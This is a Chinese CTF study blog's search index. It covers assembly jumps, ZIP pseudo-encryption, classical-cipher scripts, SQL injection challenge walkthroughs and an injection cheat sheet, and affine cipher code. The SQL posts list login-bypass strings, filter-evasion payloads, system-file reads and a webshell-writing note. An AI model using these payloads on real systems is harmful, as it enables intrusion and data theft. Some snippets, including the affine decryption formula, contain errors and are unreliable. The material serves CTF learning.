<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[test与je指令组合用法]]></title>
    <url>%2F2019%2F10%2F23%2Ftest%E4%B8%8Eje%E6%8C%87%E4%BB%A4%E7%BB%84%E5%90%88%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[0x00 指令介绍test 指令用于两个操作数的按位AND运算，并根据结果设置标志寄存器，结果本身不会写回到目的操作数。要点： 1. AND 运算结果为0时， ZF(zero flag)置位； 2. test可以影响CF，OF，PF，SF，ZF标志位； 3. 两个操作数相等，同时为0时，AND 结果为0， 此时ZF置位。je 指令【Jump if Equals】在ZF被置位时跳转。je 是 jz 【Jump if Zero】的别名 0x01 test 和 je 连用TEST EAX,EAX JE some_address 这段代码的含义是： 如果eax==0的话就跳转到”some_address”。 运算过程： CPU只在 ZF = 1的时候跳转，因此，需要让AND(EAX, EAX) = 0 。而什么时候这个运算为0呢？上文已经提过了，就是EAX = 0的时候。隐含条件是test的两个运算数相等，都为EAX。 等价C代码： if(eax == 0) { goto some_address }0x02 应用举例1234567; Conditional Jumptest cl, cl ; set ZF to 1 if cl == 0je 0x804f430 ; jump if ZF == 1; ortest eax, eax ; set SF to 1 if eax &lt; 0 (negative)js error ; jump if SF == 1 0x03 参考https://stackoverflow.com/questions/13064809/the-point-of-test-eax-eaxhttps://en.wikipedia.org/wiki/TEST_(x86_instruction)https://blog.csdn.net/zz709196484/article/details/77755243https://blog.csdn.net/ms2146/article/details/5279442转载自https://blog.csdn.net/counsellor/article/details/81005101，遵循 CC 4.0 BY-SA 版权协议]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>CTF 逆向</tag>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zip伪加密]]></title>
    <url>%2F2019%2F10%2F23%2F%E4%BC%AA%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[zip文件组成一个 ZIP文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。 伪加密原理zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。 判断是否为伪加密无加密压缩源文件数据区的全局加密应当为00 00 且压缩源文件目录区的全局方式位标记应当为00 00 假加密压缩源文件数据区的全局加密应当为00 00 且压缩源文件目录区的全局方式位标记应当为09 00 真加密压缩源文件数据区的全局加密应当为09 00 且压缩源文件目录区的全局方式位标记应当为09 00 破解方法winhex打开zip文件。 把504B0304后的第3、4个byte改成0000还有 把504B0102后的第5、6个byte改成0000即可破解伪加密。]]></content>
      <categories>
        <category>安全杂项</category>
      </categories>
      <tags>
        <tag>CTF 安全杂项</tag>
        <tag>文件结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的古典密码与常用脚本]]></title>
    <url>%2F2019%2F10%2F23%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%B8%8E%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[栅栏密码1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python3# -*- coding:utf-8 -*-a = open(r&apos;crypto4.txt&apos;,&apos;r&apos;)ciphertext = a.read()b = len(ciphertext)print(&apos;The ciphertext :&apos;,ciphertext)print(&apos;The length of ciphertext is&apos;,b)#将字符串转化为数组形式ciphertext = [ciphertext[i:i+1] for i in range(0,b,1)]#获取可以解密的栅栏数c =[]num = 1while num &lt;= b: if b%num == 0: c.append(num) else: pass num += 1print(&apos;每栏个数可为:&apos;,c)#将密文按照栅栏数进行分组for step in c: d = [ciphertext[i:i+step] for i in range(0,b,step)] flag = &apos;&apos; for i in range(step): for x in d: e = x[i] flag += e print(&apos;解密时每栏个数:&apos;,step,&apos;\n&apos;,d,&apos;\n&apos;,&apos;result:&apos;,flag) 培根密码 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python3#-*- coding:utf-8 -*-import re#密文转化为指定格式s = &apos;AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA&apos;a = s.lower()#字典CODE_TABLE = &#123; &apos;a&apos;:&apos;aaaaa&apos;,&apos;b&apos;:&apos;aaaab&apos;,&apos;c&apos;:&apos;aaaba&apos;,&apos;d&apos;:&apos;aaabb&apos;,&apos;e&apos;:&apos;aabaa&apos;,&apos;f&apos;:&apos;aabab&apos;,&apos;g&apos;:&apos;aabba&apos;, &apos;h&apos;:&apos;aabbb&apos;,&apos;i&apos;:&apos;abaaa&apos;,&apos;j&apos;:&apos;abaab&apos;,&apos;k&apos;:&apos;ababa&apos;,&apos;l&apos;:&apos;ababb&apos;,&apos;m&apos;:&apos;abbaa&apos;,&apos;n&apos;:&apos;abbab&apos;, &apos;o&apos;:&apos;abbba&apos;,&apos;p&apos;:&apos;abbbb&apos;,&apos;q&apos;:&apos;baaaa&apos;,&apos;r&apos;:&apos;baaab&apos;,&apos;s&apos;:&apos;baaba&apos;,&apos;t&apos;:&apos;baabb&apos;,&apos;u&apos;:&apos;babaa&apos;, &apos;v&apos;:&apos;babab&apos;,&apos;w&apos;:&apos;babba&apos;,&apos;x&apos;:&apos;babbb&apos;,&apos;y&apos;:&apos;bbaaa&apos;,&apos;z&apos;:&apos;bbaab&apos;&#125;#5个一组进行切割并解密def peigendecode(peigen): msg =&apos;&apos; codes = re.findall(r&apos;.&#123;5&#125;&apos;, a) for code in codes: if code ==&apos;&apos;: msg += &apos; &apos; else: UNCODE =dict(map(lambda t:(t[1],t[0]),CODE_TABLE.items())) msg += UNCODE[code] return msgflag = peigendecode(a)print(&apos;flag is &apos;,flag) 轮转机密码12345678910111213141516import re sss=&apos;1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt; &apos;m=&quot;NFQKSEVOQOFNP&quot; content=re.findall(r&apos;&lt; (.*?) &lt;&apos;,sss,re.S) iv=[2,3,7,5,13,12,9,1,8,10,4,11,6] vvv=[] ans=&quot;&quot; for i in range(13): index=content[iv[i]-1].index(m[i]) vvv.append(index)for i in range(0,26): flag=&quot;&quot; for j in range(13): flag+=content[iv[j]-1][(vvv[j]+i)%26] print flag 仿射密码1234567891011121314151617# coding:utf-8# a,b为y=ax+b的系数# y = 17*x-8 flag&#123;szzyfimhyzd&#125; 答案格式：flag&#123;********&#125;# Crypto为密文，res为明文，暴力破解得到，不用求取逆元import stringcrypto = &quot;szzyfimhyzd&quot;a = 17b = -8word = string.ascii_lowercase# print wordres = &apos;&apos;for c in crypto: for w in word: if ord(c)-97 == ((ord(w)-97)*a + b)%26: res += wprint res# affineshift 进制转换12345678910111213141516import binasciitext = &quot;d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e&quot;solution = &apos;&apos;text2 = text.split(&apos; &apos;)for x in text2: print x if x[0] == &apos;b&apos;: #binary solution += chr(int(x[1:],2)) elif x[0] == &apos;x&apos;: # hexadecimal solution += x[1:].decode(&quot;hex&quot;) elif x[0] == &apos;d&apos;: # decimal solution += chr(int(x[1:])) elif x[0] == &apos;o&apos;: # octal solution += chr(int(x[1:],8))print solution 16进制10进制2进制转字符串1234567891011121314import libnumimport binasciis=&quot;flag&#123;pcat&#125;&quot; #print libnum.s2n(s)print binascii.hexlify(s)n=0x666c61677b706361747d #print libnum.n2s(n)print binascii.unhexlify(str(n))b=&apos;01110000011000110110000101110100&apos; print libnum.b2s(b) unicode 转换1234567891011a=&apos;\u76;\u122;\u69;\u120;\u79;\u83;\u56;\u120;\u77;\u68;\u69;\u118;\u77;\u84;\u65;\u52;\u76;\u122;\u107;\u53;\u76;\u122;\u69;\u120;\u77;\u83;\u56;\u120;\u77;\u68;\u107;\u118;\u77;\u84;\u65;\u120;\u76;\u122;\u69;\u120;\u78;\u105;\u56;\u120;\u77;\u84;\u69;\u118;\u79;\u84;\u99;\u118;\u77;\u84;\u69;\u50;\u76;\u122;\u69;\u120;\u78;\u105;\u56;\u53;\u78;\u121;\u56;\u53;\u79;\u83;\u56;\u120;\u77;\u68;\u99;\u118;\u79;\u84;\u99;\u118;\u77;\u84;\u69;\u119;\u76;\u122;\u69;\u119;\u77;\u67;\u56;\u120;\u77;\u68;\u65;\u118;\u77;\u84;\u65;\u120;\u76;\u122;\u69;\u119;\u77;\u105;\u56;\u120;\u77;\u68;\u69;\u118;\u77;\u84;\u69;\u119;\u76;\u122;\u107;\u53;\u76;\u122;\u69;\u119;\u77;\u83;\u56;\u120;\u77;\u84;\u107;\u118;\u77;\u84;\u69;\u120;\u76;\u122;\u69;\u120;\u78;\u67;\u56;\u120;\u77;\u68;\u103;\u118;\u77;\u84;\u65;\u119;&apos;b=a.decode(&quot;utf-8&quot;)print(b)方法：s_unicode = u&apos;\u810f\u4e71&apos;s_str = s_unicode.encode(&apos;unicode-escape&apos;).decode(&apos;string_escape&apos;) 问题二：将&apos;\u810f\u4e71&apos;转换为u&apos;\u810f\u4e71&apos;方法：s_str = &apos;\u810f\u4e71&apos;s_unicode = s_str.decode(&apos;unicode-escape&apos;) 数字转字符串1234567891011121314a=[119,101,108,99,111,109,101,116,111,97,116,116,97,99,107,97,110,100,100,101,102,101,110,99,101,119,111,114,108,100]s=&apos;&apos;for i in a: s+=chr(i)print(s)s = &apos;102 108 97 103 123 115 113 108 109 52 112 95 49 53 95 112 48 119 101 114 102 117 108 125&apos;ls = s.split(&apos; &apos;)# print lsflag = &apos;&apos;for i in ls: flag += chr(int(i))print flag 字符串转16进制12import binasciiprint(binascii.b2a_hex(&apos;addddaasasabcd&apos;))]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>CTF密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL回显注入]]></title>
    <url>%2F2019%2F10%2F20%2FSQL%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[0x00 注入过程三种注入123where user_id = 1 or 1=1where user_id = &apos;1&apos; or &apos;1&apos;=&apos;1&apos;where user_id =&quot; 1 &quot;or &quot;1&quot;=&quot;1&quot; 注释符12345# 单行注释,常编码为%23--空格 单行注释 注意为短线短线空格/*（）*/ 多行注释 至少存在俩处的注入 /**/常用来作为空格 判断字段数1order by 确定回显点1union select 1,2 查询数据库信息1version() datadir 查询用户名，数据库名12345user() database()1&apos; union select 1,database()#1&apos; union select user(),database()#Version()# 查询表名11&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()# 查询列名121&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =0x7573657273#1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =&apos;users&apos;# 文件读取1union select 1,load_file(&apos;C:\\wondows\\win.ini&apos;)# 写入 webshell1select..into outfile... 猜用户数据1231&apos; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #1&apos; union select null,concat_ws(char(32,58,32),user,password) from users # 1&apos; union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users # 猜 root 用户11&apos; union select 1,group_concat(user,password) from mysql.user# 0x01 bugku 这是一个神奇的登录框1、打开题目链接，是一个登录界面，抓包后传数据进行尝试 2、先尝试admin_name=1&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到Try Again! 3、尝试admin_name=1’&amp;admin_passwd=1&amp;submit=GO+GO+GO 仍然得到Try Again! ，说明 ’被过滤了 4、尝试admin_name=1”&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到You have an error in your SQL syntax; check the manual that corresponds toyour MySQL server version for the right syntax to use near ‘1”‘ at line 1 说明应该用 “ 分隔,”符号没有被过滤。 5、尝试admin_name=1”%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 发现没有报错了，说明，需要注释掉一些多余的东西来得到正确结果 6、判断回显位置 admin_name=1” union select 1%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到The used SELECT statements have a different number ofcolumns（因为union前后的列数不相同） 再改payload为 admin_name=1” union select 1，2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 发现回显位置在Login_name那里 7、爆数据库名 admin_name=1” union select database(),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到bugkusql1 8、爆表名 admin_name=1” union select (select table_name from information_schema.tableswhere table_schema=database() limit 0,1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到flag1 改limit 0,1为limt 1,1 得到whoami 9、爆字段 admin_name=1” union select (select column_name from information_schema.columnswhere table_name=’flag1’),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到flag1 10、flag admin_name=1” union select (select flag1 fromflag1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到ed6b28e684817d9efcaf802979e57aea 备注 在admin_name或者admin_passwd 两处都可以进行爆破 最初尝试admin_name=1” union select1，2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO时没有看出来回显在1处，导致，再次尝试admin_name=1”union select 1，database()%23&amp;admin_passwd=1&amp;submit=GO+GO+GO时发现没有回显 用错误注入updatexml也可以得到数据库名，表名，字段名，但是爆flag时，因为flag太长，导致无法全部回显 0x02 bugku 多次很明显 注入点在id上 参数id只有5个，等于6的时候显示Error 测试1 id=1’ or 1=1# 返回错误，猜测可能有字符被过滤 测试2 id=1’ oorr 1=1–+ 返回正常结果，通过双写绕过 异或注入 id=1’^(length(‘被测试字符’)=0)–+ 例如：id=1’^(length(‘select’)=0)–+ 发现返回错误 因为select被过滤，那么length(‘’)就等于0，(length(‘’)=0)此等式成立，返回值为1，再和1异或结果为0，所以页面返回错误 检测出select、and 、or被过滤 注意：information中有一个or 同样道理，测试出过滤字符 select,union,and,or 可以采用双写绕过。测试payload： http://120.24.86.145:9004/1ndex.php?id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,2%23 页面结果 2 database: ?id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,database()%23 web1002-1 tables: 注意information里面有or，要双写过滤 ?id=-1’ ununionion seselectlect 1, group_concat(table_name) frominfoorrmation_schema.tables where table_schema=database() # 页面结果 flag1,hint columns: ?id=-1’ ununionion seselectlect 1, group_concat(column_name) frominfoorrmation_schema.columns where table_schema=database() ananddtable_name=’flag1’ %23 页面结果 flag1,address dump: ?id=-1’ ununionion seselectlect 1, group_concat(flag1) from flag1 %23 页面结果 usOwycTju+FTUUzXosjr ?id=-1’ ununionion seselectlect 1, group_concat(address) from flag1 %23 0x04 百度杯sql总结：用&lt;&gt;隔开敏感字符，绕过防注入 Order by 3与 union select 1，2，3都可以判断列数 输入and 1=1 发现被拦截 此外 测试了or 发现也进行了拦截 id=1 and 1=1 id=1 or 1=1 我们可以用下面的字符来替换 and 和 or and—-&gt;&amp;&amp; , or—–&gt; || id=1 &amp;&amp; 1=1 替换后发现可以成功绕过 接下来进行猜字段长度 发现order by 被拦截 id=1 order by 1 用&lt;&gt;把字符隔开，这里需要注意不要这样隔开or&lt;&gt;der,这样or又是一个被拦截的字符 然后利用二分法，才接触长度为3 id=1 o&lt;&gt;rder by 3 id=1 union se&lt;&gt;lect 1,2,3 在注入的时候select会被拦截，同样我们用&lt;&gt;把字符分开即可 界面出现2，我们就在2的位置进行注入 12345678id=1 union se&lt;&gt;lect 1,database(),3id=1 union se&lt;&gt;lect 1,table_name,3 from information_schema.tables where table_schema=&apos;sqli&apos;id=1 union se&lt;&gt;lect 1,column_name,3 from information_schema.columns where table_schema=&apos;sqli&apos; an&lt;&gt;d table_name=&apos;info&apos;id=1 union se&lt;&gt;lect 1,flag,3 from info]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>SQL注入漏洞</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入总结]]></title>
    <url>%2F2019%2F10%2F20%2FSQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[0x00 SQL注入原理与分类原理SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。 分类1按照参数类型可分为两种：数字型和字符型。当发生注入点的参数为整数时，比如 ID，num，page等，这种形式的就属于数字型注入漏洞。同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合。 2根据数据库返回的结果，分为回显注入、报错注入、盲注。 回显注入：可以直接在存在注入点的当前页面中获取返回结果。 报错注入：程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。 盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。 3按照注入位置及方式不同分为：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入 0X01 注入常见参数user()：当前数据库用户 database()：当前数据库名 version()：当前使用的数据库版本 @@datadir：数据库存储数据路径 concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password) group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来 concat_ws()：用法类似 hex() 和 unhex()：用于 hex 编码解码 load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\ select xxoo into outfile &apos;路径&apos;：权限较高时可直接写文件0x02 后台万能密码admin&apos; -- admin&apos; # admin&apos;/* &apos; or 1=1-- &apos; or 1=1# &apos; or 1=1/* &apos;) or &apos;1&apos;=&apos;1-- &apos;) or (&apos;1&apos;=&apos;1-- 以不同的用户登陆 &apos; UNION SELECT 1, &apos;anotheruser&apos;, &apos;doesnt matter&apos;, 1--0x03 Mysql相关知识MySQL数据库的特有的表是 information_schema.tables , access数据库特有的表是 msysobjects 、SQLServer 数据库特有的表是 sysobjects 。那么，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库 12345678//判断是否是 Mysql数据库http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from information_schema.tables) # //判断是否是 access数据库http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from msysobjects) #//判断是否是 Sqlserver数据库http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from sysobjects) # 对于MySQL数据库，information_schema 数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。 mysql中注释符：# 、/**/ 、 –information_schema数据库中三个很重要的表：• information_schema.schemata: 该数据表存储了mysql数据库中的所有数据库的库名 • information_schema.tables： 该数据表存储了mysql数据库中的所有数据表的表名 • information_schema.columns: 该数据表存储了mysql数据库中的所有列的列名 常用函数ascii(str) : 返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NULL，返回NULL。如 ascii(“a”)=97 length(str) : 返回给定字符串的长度，如 length(“string”)=6 substr(string,start,length) : 对于给定字符串string，从start位开始截取，截取length长度 ,如 substr(“chinese”,3,2)=”in” substr()、stbstring()、mid() 三个函数的用法、功能均一致 concat(username)：将查询到的username连在一起，默认用逗号分隔 concat(str1,’‘,str2)：将字符串str1和str2的数据查询到一起，中间用连接group_concat(username) ：将username数据查询在一起，用逗号连接 limit 0,1：查询第1个数limit 1,1： 查询第2个数limit n,1： 查询第n+1个数 CONV(n,from_radix,to_radix)：用于将n从from_radix进制转到to_radix进制 0x04 判断是否存在SQL注入1.可以用网站漏洞扫描工具进行扫描，常见的网站漏洞扫描工具有 AWVS、AppScan、OWASP-ZAP、Nessus 等。 2.先加单引号、双引号、单括号、双括号等看看是否报错，如果报错就肯定存在SQL注入漏洞了。还有在URL后面加and 1=1 、 and 1=2看页面是否显示一样，显示不一样的话，肯定存在SQL注入漏洞了。 0x05 获取数据库名12345SELECT database();SELECT schema_name FROM information_schema.schemata;id=1&apos; union select 1,database() #;admin_name=1&quot; union select database(),2%23;id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,database()%23; 0x06 获取表名1234union select table_name from information_schema.tables where table_schema=database(); admin_name=1&quot; union select (select table_name from information_schema.tables where table_schema=database() limit 0,1),2%23;union select 1,table_name from information_schema.tables where table_schema=&apos; &apos;;?id=-1&apos; ununionion seselectlect 1, group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() #; 0x07 获取列名12345union select group_concat(column_name) from information_schema.columns where table_name = &apos;tablename&apos;;admin_name=1&quot; union select (select column_name from information_schema.columns where table_name=&apos;flag1&apos;),2%23;?id=-1&apos; ununionion seselectlect 1, group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() anandd table_name=&apos;flag1&apos; %23;union select 1,column_name from information_schema.columns where table_schema=&apos; &apos; and table_name=&apos; &apos;;id=-1&apos; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467# //这里需要用16进制绕过 0x08 查询结果123?id=-1&apos; ununionion seselectlect 1, group_concat(flag1) from flag1 %23；admin_name=1&quot; union select (select flag1 from flag1),2%23；d=-1&apos; union select 1,2,3,skctf_flag from fl4g#； 0x09 常用的绕过绕过引号限制1234567hex 编码select * from users where username = 0x61646D696Echar() 函数select * from users where username = char(97, 100, 109, 105, 110) 绕过字符串黑名单1234select &apos;a&apos; &apos;d&apos; &apos;mi&apos; &apos;n&apos;;select concat(&apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);select select_WS(&apos;&apos;, &apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);select group_concat(&apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;); 绕过逗号substr(),mid(),limit这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。 123456select substr(database(0 from 1 for 1);select mid(database(0 from 1 for 1);select * from news limit 0,1；# 等价于下面这条SQL语句select * from news limit 1 offset 0； 比较符(&lt;,&gt;)绕过使用二分查找的时候需要使用到比较操作符来进行查找。需要使用到greatest来进行绕过 1select * from users where id=1 and ascii(substr(database(),0,1))&gt;64； 如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符。greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。 1select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 0x10 常用sql语句1234567891011选择：select * from table1 where 范围 插入：insert into table1(field1,field2) values(value1,value2) 删除：delete from table1 where 范围 更新：update table1 set field1=value1 where 范围 查找：select * from table1 where field1 like &apos;%value1%&apos; 排序：select * from table1 order by field1,field2 [desc] 总数：select count as totalcount from table1 求和：select sum(field1) as sumvalue from table1 平均：select avg(field1) as avgvalue from table1 最大：select max(field1) as maxvalue from table1 最小：select min(field1) as minvalue from table1 1234567891011UNION 运算符 UNION 运算符通过组合其他两个结果表（例如 TABLE1 和 TABLE2）并消去表中任何重复行而派生 出一个结果表。当 ALL 随 UNION 一起使用时（即 UNION ALL），不消除重复行。两种情况下，派 生表的每一行不是来自 TABLE1 就是来自 TABLE2。 EXCEPT 运算符 EXCEPT 运算符通过包括所有在 TABLE1 中但不在 TABLE2 中的行并消除所有重复行而派生出一个 结果表。当 ALL 随 EXCEPT 一起使用时 (EXCEPT ALL)，不消除重复行。 INTERSECT 运算符 INTERSECT 运算符通过只包括 TABLE1 和 TABLE2 中都有的行并消除所有重复行而派生出一个结果 表。当 ALL 随 INTERSECT 一起使用时 (INTERSECT ALL)，不消除重复行。 注：使用运算词的几个查询结果行必须是一致的。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>SQL注入漏洞</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[仿射密码]]></title>
    <url>%2F2019%2F10%2F19%2F%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[0x01 算法原理仿射密码是一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。 加密函数：E(x) = (ax + b) (mod m)，其中 a与b互质，m是编码系统中字母的个数（通常都是26）。 解密函数：D(x) = a^{-1} (x - b) (mod m)，其中 a^{-1} 是 a 在Z_{m}群的乘法逆元。 a,b是密钥，为满足0≤a,b≤25和gcd(a,26)等于1的整数。a-1表示a的逆元，即a-1*a ≡ 1mod26 0x02 算法实现（加密与解密）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define N 100int main()&#123; char m[N+1],c[N+1]; int k1,k2; printf(&quot;请输入原文:&quot;);//以回车（换行）作为字符串读取的结束,默认遇空格、回车、跳格键结束。 scanf(&quot;%[^\n]&quot;,m);//开始加密 printf(&quot;\n请输入密钥k1,k2:&quot;);//一次读取多个数值时的格式设置,默认以空格、回车分隔数值，若想以逗号分隔不同数值则需在&quot;&quot;内将格式设置为&quot;%d,%d&quot;，如scanf(&quot;%d,%d&quot;,&amp;k1,&amp;k2)则输入时仅以逗号分隔。 scanf(&quot;%d%d&quot;,&amp;k1,&amp;k2); for (int i=0;i&lt;strlen(m);i++) &#123;////&apos;a&apos;对应97,&apos;A&apos;对应65. 以下两式子等价 //c[i]=(m[i]-&apos;a&apos;+k2)%26+97;//c[i]=(m[i]-97+k2)%26+97; if(m[i]&gt;=&apos;A&apos;&amp;&amp;m[i]&lt;=&apos;Z&apos;) c[i]=&apos;A&apos;+(k1*(m[i]-&apos;A&apos;)+k2)%26; else if(m[i]&gt;=&apos;a&apos;&amp;&amp;m[i]&lt;=&apos;z&apos;) c[i]=&apos;a&apos;+(k1*(m[i]-&apos;a&apos;)+k2)%26; else c[i]=m[i]; //单字符输出每一个密文： &#125; printf(&quot;\n密文是: %s&quot;,c); int r0=26,t0=0,t1=1,r1=k1,r2,t2,q; while(r1!=0) &#123; q=r0/r1; r2=r0-q*r1; t2=t0-q*t1; r0=r1;r1=r2; t0=t1;t1=t2; &#125; int k1_inv=t0;//扩展欧几里得算法求逆元 printf(&quot;\n逆元 %d mod %d 是: %d&quot;,k1,r0,t0); for (int i=0;i&lt;strlen(c);i++) &#123; if(c[i]&gt;=&apos;A&apos;&amp;&amp;c[i]&lt;=&apos;Z&apos;) m[i]=&apos;A&apos;+(t0*(c[i]-&apos;A&apos;)-k2)%26; else if(c[i]&gt;=&apos;a&apos;&amp;&amp;c[i]&lt;=&apos;z&apos;) m[i]=&apos;a&apos;+(t0*(c[i]-&apos;a&apos;)-k2)%26; else m[i]=c[i]; &#125;//解密 printf(&quot;\n原文是: %s&quot;,m); &#125;]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>古典密码</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[整形溢出 int_overflow]]></title>
    <url>%2F2019%2F10%2F17%2F%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA-int_overflow%2F</url>
